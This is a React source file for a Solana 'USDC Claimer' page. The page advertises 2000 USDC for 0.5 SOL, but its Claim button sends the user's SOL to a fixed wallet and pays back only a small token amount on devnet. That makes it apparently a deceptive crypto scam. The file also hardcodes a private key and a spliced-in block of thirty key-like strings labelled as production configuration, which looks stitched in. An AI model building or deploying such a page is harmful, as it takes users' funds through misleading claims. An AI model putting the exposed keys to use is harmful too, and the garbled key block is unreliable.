/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "5LR8mSH74jXViiGy3ucXb6vpzp2XGtSbJTiLbJnHSiKGho7zHapkq4sYphXyDxHJBvXpxuFRKikQxVnpaPdxBFXB"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "4THgX7ByFBcZfNjsQe6wB6uVpnjrmzdL8JiXK2iht7Uu5tEHqCgDPHCne9oh4qZ3Nujzw7QNT3dB6BHnaXpTb7vQ",
  "key1": "2GbnrH6ZcQYAouWEukrdcaUxFunLkJ2mE7iA4q2kCQC1un5kF1SXZcPbwedcCLTXGSngmTnnnmQFcRwp4ZZZBNQB",
  "key2": "5X7nXPJwcJXQJHqo33XJ7qVJpDeQ4S9gApc8XgqNN5NHsgE2dotAy6iBhFtze3ibVzwLURNYpqQgdwAy3qBnzLR8",
  "key3": "2YEAwBG1of7PgX3rAEzRzsmcjfyB265mAHBC3Vnj1xrUiWQueJHwpNqD6RD7sb7mhygCdnxNCigkc4xUd9jTzshF",
  "key4": "x1dTfL3xAQYN1TsJvR7UPti9CPfEfWMBeQabdcjrAyxPHvq8udzUjg7Xaky36MWzJDzEsFZeL3wgKNU9H9M2X2E",
  "key5": "suNkex1i3rzZWLikdAkwtJeviptDZmL46EuXBL5t9hAR8vkueQp329WVLmjT2v28cc3PGSDTvQ331sChd7qYaqE",
  "key6": "46Sj8aPTdc8XRogQeedEYYnjf9gSCHus1feJRkYZtyW8D1WWbEbKzgHEpcY8nfWD2GLhc8puf53GJttHTAZw5jVa",
  "key7": "Yv3BjhsRQo4MGs28xSkwA3q9oY2H41P4Jz2uv17kbzCh2BjdNxvbWwTBhrZm6j74KA1bWX3dkmCjPLnxLVGwK5V",
  "key8": "wMMk1xbm9vph29oSY7Dsmd2WWZUY31hoAqigZDmKium3rCJoGUmyuWYLi7NiREeqtA3t4mqjBpgScrRbZ8tNCac",
  "key9": "3vQG5bjoXzzhavNXMW39VAkumUVxWfh5ECakk2wfqVwdjemsRJBD7MMjemHFG6cZAZDxg5R7N5tXvLUk81U8AGTs",
  "key10": "63bYUC4d3XDJ4Nsv9NC8pXi6ceqhEeSAY5p8kcA7dHa2TW5SHeg647UzwzicnZdtVGpNqNDJ3FsaXmFGZjApFHmb",
  "key11": "2K68HqosCFZbsJrZdmFx3UXpG3kfYTSc8wjFZjNZfe4ecdbCMfRb4mD2Gcvto5Znp3JiE1Xbe92yQSEj1z513t4i",
  "key12": "4qDAcGZwR8nxyMsRrQ583E6TpJMh5xsKDxq1vkzXc7TWtYEcLXV1eqFPXxGJ8rXdrgM2QWoNvfi5ykDHhk7EuAYM",
  "key13": "5GGyEfcv7i2W4pb13NkuDjhYMDzpFZM6Y9Sck459eNxTXF2z1nGatHXBLaanA8r7vEomg7Fyiz16stvqzUkG5aYA",
  "key14": "2BvGkHXQDgGqkEaRp6FzrdgrEuWMfGWeUYtr8MLKRvPEtUxfqtKkpNaHUr26bZMaPFuPqgN6yKjPv8djoPYCeaAZ",
  "key15": "2dKW5azgu8HLMzeFByG24ZaNXQ4ErqWUB7ZZ7puqDM8QZuEuQzDrYX7psuvG3ponU2HNL5SFA1my3Nz8QgAS3vU1",
  "key16": "23qZMi1mAbAmsSdtWmoiKFtSZo8zjPBLx31Zdq9JzJykjGv5ZjxLMBXiy6cpthPZyTLJRy4HXqAjRsRTcoQ2QFwT",
  "key17": "3BEidmTv6pyBdfuwexLV3kLkEiXgEcSQ2LT7jwapYu3iCVY2kNdwFRqanuG5k5t4qnE91ct6rmRs77kyowTt2uev",
  "key18": "4afxDoNB7xAcqzufhDwkRacCBUBcZxj67PqbtaGNJfbzHqAjFyEKHU56eNVkra2i1Sv4oMymftE3juSrMwjKhJ32",
  "key19": "4X9bg3grzSG4KbNj7ZbzhrLEMSiQEths9Wy3n4BrUFdJeSTW8XkKv8FhRw8UwuZshmoWmcWiWfuy3fnkVr1Jeees",
  "key20": "3c8otDmKsi7atF2f2jhv25CYq24ved6x3QQmXRaFvfE7H4vqKun124eH2UgUKECAcCd8Nb9tcdJzn42MgwoNtx87",
  "key21": "26VCzGThjtK5FhHb6UxbMd9co8weu6mcUuwmAqrYt5bWgoa5aJjCzdkSEizsWE2KjQyjDqYcL2Pr1KnFehMNZjSM",
  "key22": "4JdfxNdQMVaVmzUn6qrf58jmpgFhcqKDy8EigsxfQtjjXVWVFPAEY9hmXZn3pe4bcF7UU4dsWNLjtAXP4D3kP9Ge",
  "key23": "3dPYgt5PNR7nZ5hPnGD8QXaoMs362FYSeH2auc7T5JnfRb1UBK4zY5zDWMd54ULHcYSvGA7UcdTyZhLNzQVZt1X7",
  "key24": "4BHPYtg1VC2WdwYDda9dwKFKwXZGBnJ4783Vp4aYtjXFKLUyrMU5jCa7q47mG2WTBsxt5TQy3ywjALFmeGpq9Lqs",
  "key25": "CDq3uLZiJMZY8LLn35ZcXA7FuPPP2W1AVv3onydqjGLFttcKQWBnVsyyVLnHgbEY3APEigLKnsDiEv69T6rjvX6",
  "key26": "ArK9Z7wz8PKgvXhx2vi64FUakRJjcndCHmG87zZ2qsaRWVRFuoacuQDgFQ2Rev5GtwQhkT2mrbbGehjFp69XfoR",
  "key27": "4YQVnvBwk53UeLsVZshBSUVqYx7z6CoQdfbezSAq6qoZUJAnSTvVmmocm7aW6qjoayyiwfWDRYg6B7NS69RjXtsH",
  "key28": "4BQwzyNYdD86h1Gu9THKUDpVbT1FHa9M8b7c4TdEjrRpyeZiCqnU8taTirqDUL4ChNoTrwNLt58Pvo1ywKVb13xk",
  "key29": "3zi7wdunbF7s2HeZdaJT4h5zgNwwBxJVtVU7EvWtxn44b7FWFRByVLB2CJPh2ybMw2ZxgFDWcWA43GbKBkXun1fm"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
